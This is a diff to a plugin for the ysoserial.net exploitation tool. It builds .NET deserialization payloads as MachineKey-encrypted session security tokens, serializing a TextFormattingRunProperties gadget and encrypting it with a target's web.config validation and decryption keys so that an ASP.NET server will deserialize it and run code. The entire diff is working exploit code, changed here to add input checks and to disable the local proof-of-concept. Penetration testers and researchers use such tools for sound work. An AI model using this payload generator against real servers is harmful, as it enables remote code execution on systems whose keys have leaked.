@@ -3,12 +3,8 @@ using NDesk.Options;
 using System;
 using ysoserial.Generators;
 using System.IdentityModel;
-using System.IO;
-using System.Xml;
-using System.IdentityModel.Tokens;
 using ysoserial.Helpers;
-using System.IdentityModel.Services.Tokens;
-using AspNetTicketBridge;
+
 
 /**
  * Author: L@2uR1te (@2308652512)
@@ -44,10 +40,10 @@ namespace ysoserial.Plugins
                 {"t|test", "In this scenario, the test mode should not be applied, as the sink point relies on the web environment. Default: false", v => test =  v != null },
                 {"minify", "Whether to minify the payloads where applicable (experimental). Default: false", v => minify =  v != null },
                 {"ust|usesimpletype", "This is to remove additional info only when minifying and FormatterAssemblyStyle=Simple. Default: true", v => useSimpleType =  v != null },
-                {"vk|validationKey=", "Enter the validationKey from the web.config", v => validationKey = v },
-                {"ek|decryptionKey=", "Enter the decryptionKey from the web.config", v => decryptionKey = v },
-                {"va|validationAlg=", "Enter the validation from the web.config. Default: HMACSHA1. e.g: HMACSHA1/HMACSHA256/HMACSHA384/HMACSHA512", v => validationAlg = v },
-                {"da|decryptionAlg=", "Enter the validation from the web.config. Default: AES. e.g: AES/DES/3DES", v => decryptionAlg = v }
+                {"vk|validationkey=", "Enter the validationKey from the web.config", v => validationKey = v },
+                {"ek|decryptionkey=", "Enter the decryptionKey from the web.config", v => decryptionKey = v },
+                {"va|validationalg=", "Enter the validation from the web.config. Default: HMACSHA1. e.g: HMACSHA1/HMACSHA256/HMACSHA384/HMACSHA512", v => validationAlg = v },
+                {"da|decryptionalg=", "Enter the decryption from the web.config. Default: AES. e.g: AES/DES/3DES", v => decryptionAlg = v }
             };
 
         public string Name()
@@ -110,9 +106,18 @@ namespace ysoserial.Plugins
                 System.Environment.Exit(-1);
             }
 
+            if (String.IsNullOrEmpty(validationKey) || String.IsNullOrWhiteSpace(validationKey) || String.IsNullOrEmpty(decryptionKey) || String.IsNullOrWhiteSpace(decryptionKey))
+            {
+                Console.Write("ysoserial: ");
+                Console.WriteLine("validationkey or decryptionkey has not been provided correctly.");
+                Console.WriteLine("Try 'ysoserial -p " + Name() + " --help' for more information.");
+                System.Environment.Exit(-1);
+            }
+
+
             byte[] serializedData = (byte[])new TextFormattingRunPropertiesGenerator().GenerateWithNoTest("BinaryFormatter", inputArgs);
             DeflateCookieTransform myDeflateCookieTransform = new DeflateCookieTransform();
-            MachineKeyDataProtector Protector = new MachineKeyDataProtector(validationKey, decryptionKey, decryptionAlg, validationAlg, purposes);
+            MachineKeyHelper.MachineKeyDataProtector Protector = new MachineKeyHelper.MachineKeyDataProtector(validationKey, decryptionKey, decryptionAlg, validationAlg, purposes);
             byte[] deflateEncoded = myDeflateCookieTransform.Encode(serializedData);
             byte[] encryptedEncoded = Protector.Protect(deflateEncoded);
             payload = String.Format(payload, Convert.ToBase64String(encryptedEncoded));
@@ -128,11 +133,11 @@ namespace ysoserial.Plugins
                 // PoC on how it works in practice
                 try
                 {
-                    //In this scenario, the test mode should not be applied, as the sink point relies on the web environment.
-                    //Please run the following code in a web environment configured with a MachineKey for experimentation.
-                    XmlReader tokenXML = XmlReader.Create(new StringReader(payload));
-                    MachineKeySessionSecurityTokenHandler myMachineKeySessionSecurityTokenHandler = new MachineKeySessionSecurityTokenHandler();
-                    myMachineKeySessionSecurityTokenHandler.ReadToken(tokenXML);
+                    //XmlReader tokenXML = XmlReader.Create(new StringReader(payload));
+                    //MachineKeySessionSecurityTokenHandler myMachineKeySessionSecurityTokenHandler = new MachineKeySessionSecurityTokenHandler();
+                    //myMachineKeySessionSecurityTokenHandler.ReadToken(tokenXML);
+                    Console.WriteLine("In this scenario, the test mode should not be applied, as the sink point relies on the web environment.");
+                    Console.WriteLine("The comments in the MachineKeySessionSecurityTokenHandlerPlugin.cs file provide test code. Please run the test code in a Web environment configured with MachineKey to observe the effects of deserialization attacks.");
                 }
                 catch (Exception err)
                 {
